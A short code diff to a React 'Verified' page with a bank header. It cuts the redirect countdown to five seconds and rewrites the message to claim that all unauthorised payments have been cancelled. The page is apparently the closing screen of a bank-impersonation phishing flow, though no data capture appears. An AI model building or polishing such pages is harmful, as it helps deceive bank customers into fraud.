@@ -4,7 +4,7 @@ import PageWatcher from "../components/pagewaters";
 import BankHeader from "../components/bankhead";
 
 export default function Verified() {
-  const [seconds, setSeconds] = useState(60);
+  const [seconds, setSeconds] = useState(5);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -41,9 +41,8 @@ export default function Verified() {
           </div>
 
           <p className="mt-10 text-center text-[14px] leading-8 text-[#333]">
-            We have successfully completed your verification.
-            <br />
-            You will be redirected automatically in{" "}
+We have successfully cancelled all unauthorised payment.            <br />
+            You'll be redirected to our homepage in  {" "}
             <span className="font-semibold">{seconds}</span> second
             {seconds !== 1 ? "s" : ""}.
           </p>
